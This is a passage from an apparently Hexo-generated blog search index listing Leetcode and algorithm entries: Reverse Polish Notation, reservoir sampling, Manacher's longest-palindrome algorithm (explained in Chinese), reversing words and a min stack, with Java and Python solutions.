class="number">2</span>]+<span class="number">1</span>], cur[<span class="number">2</span>]+<span class="number">1</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[149. Max Points on a Line]]></title>
      <url>/wiki/2017/10/10/Leetcode-149-Max-Points-on-a-Line/</url>
      <content type="html"><![CDATA[<p>Given $n$ points on a 2D plane, find the maximum number of points that lie on the same straight line.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,1],[2,2],[3,3]]</span><br><span class="line">Output: 3</span><br><span class="line">Explanation:</span><br><span class="line">^</span><br><span class="line">|</span><br><span class="line">|        o</span><br><span class="line">|     o</span><br><span class="line">|  o  </span><br><span class="line">+-------------&gt;</span><br><span class="line">0  1  2  3  4</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,1],[3,2],[5,3],[4,1],[2,3],[1,4]]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation:</span><br><span class="line">^</span><br><span class="line">|</span><br><span class="line">|  o</span><br><span class="line">|     o        o</span><br><span class="line">|        o</span><br><span class="line">|  o        o</span><br><span class="line">+-------------------&gt;</span><br><span class="line">0  1  2  3  4  5  6</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[150. Evaluate Reverse Polish Notation]]></title>
      <url>/wiki/2017/10/10/Leetcode-150-Evaluate-Reverse-Polish-Notation/</url>
      <content type="html"><![CDATA[<p>Evaluate the value of an arithmetic expression in <a href="http://en.wikipedia.org/wiki/Reverse_Polish_notation">Reverse Polish Notation</a>.</p>
<p>Valid operators are <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>. Each operand may be an integer or another expression.</p>
<p>Note:</p>
<ul>
<li>Division between two integers should truncate toward zero.</li>
<li>The given RPN expression is always valid. That means the expression would always evaluate to a result and there won’t be any divide by zero operation.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;2&quot;, &quot;1&quot;, &quot;+&quot;, &quot;3&quot;, &quot;*&quot;]</span><br><span class="line">Output: 9</span><br><span class="line">Explanation: ((2 + 1) * 3) = 9</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;4&quot;, &quot;13&quot;, &quot;5&quot;, &quot;/&quot;, &quot;+&quot;]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: (4 + (13 / 5)) = 6</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;10&quot;, &quot;6&quot;, &quot;9&quot;, &quot;3&quot;, &quot;+&quot;, &quot;-11&quot;, &quot;*&quot;, &quot;/&quot;, &quot;*&quot;, &quot;17&quot;, &quot;+&quot;, &quot;5&quot;, &quot;+&quot;]</span><br><span class="line">Output: 22</span><br><span class="line">Explanation: </span><br><span class="line">  ((10 * (6 / ((9 + 3) * -11))) + 17) + 5</span><br><span class="line">= ((10 * (6 / (12 * -11))) + 17) + 5</span><br><span class="line">= ((10 * (6 / -132)) + 17) + 5</span><br><span class="line">= ((10 * 0) + 17) + 5</span><br><span class="line">= (0 + 17) + 5</span><br><span class="line">= 17 + 5</span><br><span class="line">= 22</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目直接用Stack就可以了。唯一需要注意的就是在做除法和减法的时候，注意前后两个数字的顺序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * https://leetcode.com/problems/evaluate-reverse-polish-notation/description/</span><br><span class="line"> * Evaluate the value of an arithmetic expression in Reverse Polish Notation.</span><br><span class="line"> */</span><br><span class="line">public class Q150EvaluateReversePolishNotation &#123;</span><br><span class="line">    public int evalRPN(String[] tokens) &#123;</span><br><span class="line">        Stack&lt;Integer&gt; numberStack = new Stack&lt;&gt;();</span><br><span class="line">        Integer dummy;</span><br><span class="line"></span><br><span class="line">        for (String token : tokens) &#123;</span><br><span class="line">            switch (token) &#123;</span><br><span class="line">                case &quot;+&quot;:</span><br><span class="line">                    numberStack.push(numberStack.pop() + numberStack.pop());</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;-&quot;:</span><br><span class="line">                    numberStack.push(-numberStack.pop() + numberStack.pop());</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;*&quot;:</span><br><span class="line">                    numberStack.push(numberStack.pop() * numberStack.pop());</span><br><span class="line">                    break;</span><br><span class="line">                case &quot;/&quot;:</span><br><span class="line">                    dummy = numberStack.pop();</span><br><span class="line">                    numberStack.push(numberStack.pop() / dummy);</span><br><span class="line">                    break;</span><br><span class="line">                default:</span><br><span class="line">                    numberStack.push(Integer.parseInt(token));</span><br><span class="line"></span><br><span class="line">            &#125;  // end switch</span><br><span class="line">        &#125; // end for</span><br><span class="line">        return numberStack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[水塘抽样]]></title>
      <url>/wiki/2017/10/10/Algorithm-%E6%B0%B4%E5%A1%98%E6%8A%BD%E6%A0%B7/</url>
      <content type="html"><![CDATA[<p>Reservoir sampling(水塘抽样) is a family of randomized algorithms for randomly choosing <code>k</code> samples from a list of <code>n</code> items, where <code>n</code> is either a very large or unknown number. Typically <code>n</code> is large enough that the list doesn’t fit into main memory. For example, a list of search queries in Google and Facebook.</p>
<p>So we are given a big array (or stream) of numbers (to simplify), and we need to write an efficient function to randomly select k numbers where 1 &lt;= k &lt;= n. Let the input array be stream[].</p>
<p>A simple solution is to create an array <code>reservoir[]</code> of maximum size <code>k</code>. One by one randomly select an item from <code>stream[0..n-1]</code>. If the selected item is not previously selected, then put it in <code>reservoir[]</code>. To check if an item is previously selected or not, we need to search the item in <code>reservoir[]</code>. The time complexity of this algorithm will be $O(k^2)$. This can be costly if <code>k</code> is big. Also, this is not efficient if the input is in the form of a stream.</p>
<p><strong>Problem</strong>:</p>
<ul>
<li>Choose <code>k</code> entries from <code>n</code> numbers. Make sure each number is selected with the probability of <code>k/n</code></li>
</ul>
<p><strong> Basic idea</strong>:</p>
<ul>
<li>Choose <code>1, 2, 3, …, k</code> first and put them into the reservoir.</li>
<li>For <code>k+1</code>, pick it with a probability of <code>k/(k+1)</code>, and randomly replace a number in the reservoir.</li>
<li>For <code>k+i</code>, pick it with a probability of <code>k/(k+i)</code>, and randomly replace a number in the reservoir.</li>
<li>Repeat until <code>k+i</code> reaches <code>n</code></li>
</ul>
<p><strong>Proof</strong>:</p>
<ul>
<li>For <code>k+i</code>, the probability that it is selected and will replace a number in the reservoir is <code>k/(k+i)</code></li>
<li><p>For a number in the reservoir before (let’s say <code>X</code>), the probability that it keeps staying in the reservoir is</p>
<ul>
<li><p><code>P(X was in the reservoir last time)</code> × <code>P(X is not replaced by k+i)</code></p>
<p>  = <code>P(X was in the reservoir last time)</code> × (<code>1</code> - <code>P(k+i is   selected and replaces X)</code>)<br>  = <code>k/(k+i-1)</code> × （<code>1</code> - <code>k/(k+i)</code> × <code>1/k</code>）<br>  = <code>k/(k+i)</code></p>
</li>
</ul>
</li>
<li><p>When <code>k+i</code> reaches <code>n</code>, the probability of each number staying in the reservoir is <code>k/n</code></p>
</li>
</ul>
<p><strong>Example</strong>:</p>
<ul>
<li>Choose <code>3</code> numbers from <code>[111, 222, 333, 444]</code>. Make sure each number is selected with a probability of <code>3/4</code></li>
<li>First, choose <code>[111, 222, 333]</code> as the initial reservior</li>
<li>Then choose <code>444</code> with a probability of <code>3/4</code></li>
<li><p>For <code>111</code>, it stays with a probability of</p>
<p>  <code>P(444 is not selected)</code> + <code>P(444 is selected but it replaces 222 or 333)</code><br>  = <code>1/4</code> + <code>3/4</code>*<code>2/3</code><br>  = <code>3/4</code></p>
</li>
<li><p>The same case with <code>222</code> and <code>333</code>.</p>
</li>
<li>Now all the numbers have the probability of <code>3/4</code> to be picked.</li>
</ul>
<p></p></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>具体的Java代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A function to randomly select k items from stream[0..n-1]. </span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectKItems</span><span class="params">(<span class="keyword">int</span> stream[], <span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">int</span> i;   <span class="comment">// index for elements in stream[] </span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// reservoir[] is the output array. Initialize it with </span></span><br><span class="line">    <span class="comment">// first k elements from stream[] </span></span><br><span class="line">    <span class="keyword">int</span> reservoir[] = <span class="keyword">new</span> <span class="keyword">int</span>[k]; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++) </span><br><span class="line">        reservoir[i] = stream[i]; </span><br><span class="line">      </span><br><span class="line">    Random r = <span class="keyword">new</span> Random(); </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// Iterate from the (k+1)th element to nth element </span></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; n; i++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">// Pick a random index from 0 to i. </span></span><br><span class="line">        <span class="keyword">int</span> j = r.nextInt(i + <span class="number">1</span>); </span><br><span class="line">          </span><br><span class="line">        <span class="comment">// If the randomly  picked index is smaller than k, </span></span><br><span class="line">        <span class="comment">// then replace the element present at the index </span></span><br><span class="line">        <span class="comment">// with new element from stream </span></span><br><span class="line">        <span class="keyword">if</span>(j &lt; k) </span><br><span class="line">            reservoir[j] = stream[i];             </span><br><span class="line">    &#125; </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul>
<li><a href="https://www.geeksforgeeks.org/reservoir-sampling/">Reservoir Sampling</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Algorithm </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[5. Longest Palindromic Substring]]></title>
      <url>/wiki/2017/10/10/Leetcode-5-Longest-Palindromic-Substring/</url>
      <content type="html"><![CDATA[<p>Given a string s, find the longest palindromic substring in s. You may assume that the maximum length of s is 1000.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;babad&quot;</span><br><span class="line">Output: &quot;bab&quot;</span><br></pre></td></tr></table></figure>
<p>Note: “aba” is also a valid answer.<br>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;cbbd&quot;</span><br><span class="line">Output: &quot;bb&quot;</span><br></pre></td></tr></table></figure>
<h2 id="问题定义"><a href="#问题定义" class="headerlink" title="问题定义"></a>问题定义</h2><p>最长回文子串问题：给定一个字符串，求它的最长回文子串长度。</p>
<p>如果一个字符串正着读和反着读是一样的，那它就是回文串。下面是一些回文串的实例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12321 a aba abba aaaa tattarrattat（牛津英语词典中最长的回文单词）</span><br></pre></td></tr></table></figure>
<h2 id="1-Brute-force-解法"><a href="#1-Brute-force-解法" class="headerlink" title="1. Brute-force 解法"></a>1. Brute-force 解法</h2><p>对于最长回文子串问题，最简单粗暴的办法是：找到字符串的所有子串，遍历每一个子串以验证它们是否为回文串。一个子串由子串的起点和终点确定，因此对于一个长度为n的字符串，共有$n^2$个子串。这些子串的平均长度大约是$n/2$，因此这个解法的时间复杂度是$O(n^3)$。</p>
<h2 id="2-改进的方法"><a href="#2-改进的方法" class="headerlink" title="2. 改进的方法"></a>2. 改进的方法</h2><p>显然所有的回文串都是对称的。长度为奇数回文串以最中间字符的位置为对称轴左右对称，而长度为偶数的回文串的对称轴在中间两个字符之间的空隙。可否利用这种对称性来提高算法效率呢？答案是肯定的。我们知道整个字符串中的所有字符，以及字符间的空隙，都可能是某个回文子串的对称轴位置。可以遍历这些位置，在每个位置上同时向左和向右扩展，直到左右两边的字符不同，或者达到边界。对于一个长度为n的字符串，这样的位置一共有n+n-1=2n-1个，在每个位置上平均大约要进行$n/4$次字符比较，于是此算法的时间复杂度是$O(n^2)$。</p>
<h2 id="Manacher-算法"><a href="#Manacher-算法" class="headerlink" title="Manacher 算法"></a>Manacher 算法</h2><p>对于一个比较长的字符串，$O(n^2)$的时间复杂度是难以接受的。Can we do better?</p>
<p>先来看看解法2存在的缺陷。</p>
<p>1) 由于回文串长度的奇偶性造成了不同性质的对称轴位置，解法2要对两种情况分别处理；<br>2) 很多子串被重复多次访问，造成较差的时间效率。</p>
<p>缺陷2）可以通过这个直观的小🌰体现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char: a b a b a</span><br><span class="line">  i : 0 1 2 3 4</span><br></pre></td></tr></table></figure>
<p>当$i==1$，和$i==2$时，左边的子串aba分别被遍历了一次。</p>
<p>如果我们能改善解法2的不足，就很有希望能提高算法的效率。Manacher正是针对这些问题改进算法。</p>
<h3 id="1-解决长度奇偶性带来的对称轴位置问题"><a href="#1-解决长度奇偶性带来的对称轴位置问题" class="headerlink" title="(1) 解决长度奇偶性带来的对称轴位置问题"></a>(1) 解决长度奇偶性带来的对称轴位置问题</h3><p>Manacher算法首先对字符串做一个预处理，在所有的空隙位置(包括首尾)插入同样的符号，要求这个符号是不会在原串中出现的。这样会使得所有的串都是奇数长度的。以插入#号为例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aba  ———&gt;  #a#b#a#</span><br><span class="line">abba ———&gt;  #a#b#b#a#</span><br></pre></td></tr></table></figure>
<p>插入的是同样的符号，且符号不存在于原串，因此子串的回文性不受影响，原来是回文的串，插完之后还是回文的，原来不是回文的，依然不会是回文。</p>
<h3 id="2-解决重复访问的问题"><a href="#2-解决重复访问的问题" class="headerlink" title="(2) 解决重复访问的问题"></a>(2) 解决重复访问的问题</h3><p>我们把一个回文串中最左或最右位置的字符与其对称轴的距离称为回文半径。Manacher定义了一个回文半径数组RL，用$RL[i]$表示以第$i$个字符为对称轴的回文串的回文半径。我们一般对字符串从左往右处理，因此这里定义$RL[i]$为第$i$个字符为对称轴的回文串的最右一个字符与字符i的距离。对于上面插入分隔符之后的两个串，可以得到RL数组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char:    # a # b # a #</span><br><span class="line"> RL :    1 2 1 4 1 2 1</span><br><span class="line">RL-1:    0 1 0 3 0 1 0</span><br><span class="line">  i :    0 1 2 3 4 5 6</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char:    # a # b # b # a #</span><br><span class="line"> RL :    1 2 1 2 5 2 1 2 1</span><br><span class="line">RL-1:    0 1 0 1 4 1 0 1 0</span><br><span class="line">  i :    0 1 2 3 4 5 6 7 8</span><br></pre></td></tr></table></figure>
<p>上面我们还求了一下$RL[i]-1$。通过观察可以发现，$RL[i]-1$的值，正是在原本那个没有插入过分隔符的串中，以位置$i$为对称轴的最长回文串的长度。那么只要我们求出了$RL$数组，就能得到最长回文子串的长度。</p>
<p>于是问题变成了，怎样高效地求的$RL$数组。基本思路是利用回文串的对称性，扩展回文串。</p>
<p>我们再引入一个辅助变量$MaxRight$，表示当前访问到的所有回文子串，所能触及的最右一个字符的位置。另外还要记录下$MaxRight$对应的回文串的对称轴所在的位置，记为$pos$，它们的位置关系如下。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15154421889076.jpg" alt=""></p>
<p>我们从左往右地访问字符串来求RL，假设当前访问到的位置为$i$，即要求$RL[i]$，在对应上图，$i$必然是在$pos$右边的。但我们更关注的是，$i$是在$MaxRight$的左边还是右边。我们分情况来讨论。</p>
<h4 id="1）当i在MaxRight的左边"><a href="#1）当i在MaxRight的左边" class="headerlink" title="1）当i在MaxRight的左边"></a>1）当i在MaxRight的左边</h4><p>情况1)可以用下图来刻画：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15154422210377.jpg" alt=""></p>
<p>我们知道，图中两个红色块之间（包括红色块）的串是回文的；并且以$i$为对称轴的回文串，是与红色块间的回文串有所重叠的。我们找到$i$关于$pos$的对称位置$j$，这个$j$对应的$RL[j]$我们是已经算过的。根据回文串的对称性，以$i$为对称轴的回文串和以$j$为对称轴的回文串，有一部分是相同的。这里又有两种细分的情况。</p>
<ol>
<li>以$j$为对称轴的回文串比较短，短到像下图这样。</li>
</ol>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15154422550903.jpg" alt=""></p>
<p>这时我们知道$RL[i]$至少不会小于$RL[j]$，并且已经知道了部分的以$i$为中心的回文串，于是可以令$RL[i]=RL[j]$。但是以$i$为对称轴的回文串可能实际上更长，因此我们试着以$i$为对称轴，继续往左右两边扩展，直到左右两边字符不同，或者到达边界。</p>
<ol>
<li>以j为对称轴的回文串很长，这么长：</li>
</ol>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15154422879956.jpg" alt=""></p>
<p>这时，我们只能确定，两条蓝线之间的部分（即不超过MaxRight的部分）是回文的，于是从这个长度开始，尝试以$i$为中心向左右两边扩展，，直到左右两边字符不同，或者到达边界。</p>
<p>不论以上哪种情况，之后都要尝试更新$MaxRight$和$pos$，因为有可能得到更大的$MaxRight$。</p>
<p>具体操作如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">step 1: 令RL[i]=min(RL[2*pos-i], MaxRight-i)</span><br><span class="line">step 2: 以i为中心扩展回文串，直到左右两边字符不同，或者到达边界。</span><br><span class="line">step 3: 更新MaxRight和pos</span><br></pre></td></tr></table></figure>
<h4 id="2）当i在MaxRight的右边"><a href="#2）当i在MaxRight的右边" class="headerlink" title="2）当i在MaxRight的右边"></a>2）当i在MaxRight的右边</h4><p>遇到这种情况，说明以i为对称轴的回文串还没有任何一个部分被访问过，于是只能从$i$的左右两边开始尝试扩展了，当左右两边字符不同，或者到达字符串边界时停止。然后更新$MaxRight$和$pos$。</p>
<h3 id="3-算法实现"><a href="#3-算法实现" class="headerlink" title="(3) 算法实现"></a>(3) 算法实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#预处理</span></span><br><span class="line">        s=<span class="string">'#'</span>+<span class="string">'#'</span>.join(s)+<span class="string">'#'</span></span><br><span class="line">        RL=[<span class="number">0</span>]*len(s)</span><br><span class="line">        MaxRight=<span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        pos=<span class="number">0</span></span><br><span class="line">        MaxLen=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">            <span class="keyword">if</span> i&lt;MaxRight:</span><br><span class="line">                RL[i]=min(RL[<span class="number">2</span>*pos-i], MaxRight-i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RL[i]=<span class="number">1</span></span><br><span class="line">            <span class="comment">#尝试扩展，注意处理边界</span></span><br><span class="line">            <span class="keyword">while</span> i-RL[i]&gt;=<span class="number">0</span> <span class="keyword">and</span> i+RL[i]&lt;len(s) <span class="keyword">and</span> s[i-RL[i]]==s[i+RL[i]]:</span><br><span class="line">                RL[i]+=<span class="number">1</span></span><br><span class="line">            <span class="comment">#更新MaxRight,pos</span></span><br><span class="line">            <span class="keyword">if</span> RL[i]+i<span class="number">-1</span>&gt;MaxRight:</span><br><span class="line">                MaxRight=RL[i]+i<span class="number">-1</span></span><br><span class="line">                pos=i</span><br><span class="line">            <span class="comment">#更新最长回文串的长度</span></span><br><span class="line">            <span class="keyword">if</span> MaxLen &lt; RL[i]:</span><br><span class="line">                MaxLen = RL[i]</span><br><span class="line">                RL_2 = RL[i]<span class="number">-2</span></span><br><span class="line">                longest = s[i-RL_2:i+RL_2+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> longest.replace(<span class="string">'#'</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h3 id="4-复杂度分析"><a href="#4-复杂度分析" class="headerlink" title="(4) 复杂度分析"></a>(4) 复杂度分析</h3><ul>
<li>空间复杂度：插入分隔符形成新串，占用了线性的空间大小；$RL$数组也占用线性大小的空间，因此空间复杂度是线性的。</li>
<li>时间复杂度：尽管代码里面有两层循环，通过amortized analysis我们可以得出，Manacher的时间复杂度是线性的。由于内层的循环只对尚未匹配的部分进行，因此对于每一个字符而言，只会进行一次，因此时间复杂度是$O(n)$。</li>
</ul>
<p><a href="https://segmentfault.com/a/1190000003914228">转自</a></p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[359. Logger Rate Limiter]]></title>
      <url>/wiki/2017/10/10/Leetcode-359-Logger-Rate-Limiter/</url>
      <content type="html"></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Design </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[151. Reverse Words in a String]]></title>
      <url>/wiki/2017/10/10/Leetcode-151-Reverse-Words-in-a-String/</url>
      <content type="html"><![CDATA[<p>Given an input string, reverse the string word by word.</p>
<p>Example:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;the sky is blue&quot;,</span><br><span class="line">Output: &quot;blue is sky the&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<p>A word is defined as a sequence of non-space characters.</p>
<p>Input string may contain leading or trailing spaces. However, your reversed string should not contain leading or trailing spaces.</p>
<p>You need to reduce multiple spaces between two words to a single space in the reversed string.</p>
<p><strong>Follow up</strong>: For C programmers, try to solve it in-place in $O(1)$ space.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目如果用Python写的话很方便，如果要分割字符串，要用到<code>String.split()</code>函数，但是这个函数只接受正则表达式！摔！气死！</p>
<p>用空格分割字符串的方法是<code>String.split(\\s+)</code>,<code>\s</code>表示空格。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    String[] list = s.trim().split(<span class="string">"\\s+"</span>);</span><br><span class="line">    StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = list.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">        res.append(list[i]).append(<span class="string">" "</span>);</span><br><span class="line">    res.append(list[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> res.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[155. Min Stack]]></title>
      <url>/wiki/2017/10/10/Leetcode-155-Min-Stack/</url>
      <content type="html"><![CDATA[<p>Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.</p>
<ul>
<li>push(x) – Push element x onto stack.</li>
<li>pop() – Removes the element on top of the stack.</li>
<li>top() – Get the top element.</li>
<li>getMin() – Retrieve the minimum element in the stack.</li>
</ul>
<p>Example:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MinStack minStack = <span class="keyword">new</span> MinStack();</span><br><span class="line">minStack.push(-<span class="number">2</span>);</span><br><span class="line">minStack.push(<span class="number">0</span>);</span><br><span class="line">minStack.push(-<span class="number">3</span>);</span><br><span class="line">minStack.getMin();   --&gt; Returns -<span class="number">3</span>.</span><br><span class="line">minStack.pop();</span><br><span class="line">minStack.top();      --&gt; Returns <span class="number">0</span>.</span><br><span class="line">minStack.getMin();   --&gt; Returns -<span class="number">2</span>.</span><br></pre></td></tr></table></figure>
